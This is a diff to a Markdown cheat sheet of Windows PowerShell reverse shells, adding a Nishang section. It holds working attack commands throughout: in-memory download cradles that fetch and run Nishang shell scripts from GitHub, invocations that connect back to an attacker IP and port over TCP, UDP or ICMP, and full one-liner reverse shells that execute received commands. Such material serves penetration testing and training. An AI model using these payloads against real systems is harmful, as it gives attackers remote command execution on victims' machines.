@@ -42,6 +42,40 @@ $sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient
 PS C:\> $client = [System.Net.Sockets.TcpClient]::new("<IP>", "<PORT>"); $stream = $client.GetStream(); $reader = [System.IO.StreamReader]::new($stream); $writer = [System.IO.StreamWriter]::new($stream); while ($client.Connected) { while ($stream.DataAvailable) { $command = $reader.ReadLine(); $output = (Invoke-Expression $command) 2>&1 | ForEach-Object { $writer.WriteLine($_) }; $writer.Flush(); } }
 ```
 
+## 04 - Nishang
+
+### 4.1 - TCP Method
+
+```
+PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1')
+
+Invoke-PowerShellTcp -Reverse -IPAddress <attacker_IP> -Port <attacker_PORT>
+```
+
+### 4.2 - UDP Method
+
+One-liner UDP reverse shell.
+
+```powershell
+PS C:\> $endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse("<attacker_IP>"), <attacker_PORT>);$client = New-Object System.Net.Sockets.UDPClient(53);[byte[]]$bytes = 0..65535|%{0};$sendbytes = ([text.encoding]::ASCII).GetBytes('PS> ');$client.Send($sendbytes,$sendbytes.Length,$endpoint);while($true){;$receivebytes = $client.Receive([ref]$endpoint);$returndata = ([text.encoding]::ASCII).GetString($receivebytes);$sendback = (iex $returndata 2>&1 | Out-String );$sendbytes = ([text.encoding]::ASCII).GetBytes($sendback);$client.Send($sendbytes,$sendbytes.Length,$endpoint)};$client.Close()
+```
+
+Download cradle through memory.
+
+```
+PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellUdp.ps1')
+
+Invoke-PowerShellUdp -Reverse -IPAddress <attacker_IP> -Port <attacker_PORT>
+```
+
+### 4.3 - ICMP Method
+
+```
+PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1')
+
+Invoke-PowerShellIcmp -IPAddress <attacker_IP>
+```
+
 ## 04 - Generate via `powercat`
 
 Generate reverse shell.
@@ -117,14 +151,22 @@ PS C\> IEX (IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master
 ---
 ## References
 
-- [antonioCoco: ConPtyShell](https://github.com/antonioCoco/ConPtyShell)
+### Github
 
-- [Hacktricks: Shell Windows](https://book.hacktricks.xyz/shells/shells/windows)
+- [MrPineMan: Awesome Reverse Shell](https://github.com/MrPineMan/Awesome-Reverse-Shell)
+
+- [One-Lin3r](https://github.com/D4Vinci/One-Lin3r)
+
+- [samratashok: Nishang](https://github.com/samratashok/nishang)
 
 - [Powercat](https://github.com/besimorhino/powercat)
 
+- [antonioCoco: ConPtyShell](https://github.com/antonioCoco/ConPtyShell)
+
+### Hacktricks
+
+- [Hacktricks: Shell Windows](https://book.hacktricks.xyz/shells/shells/windows)
+
+### Ironhackers
+
 - [Ironhackers: Commands in Windows to Get Shell](https://ironhackers.es/en/cheatsheet/comandos-en-windows-para-obtener-shell/)
-
-- [Awesome Reverse Shell](https://github.com/MrPineMan/Awesome-Reverse-Shell)
-
-- [One-Lin3r](https://github.com/D4Vinci/One-Lin3r)
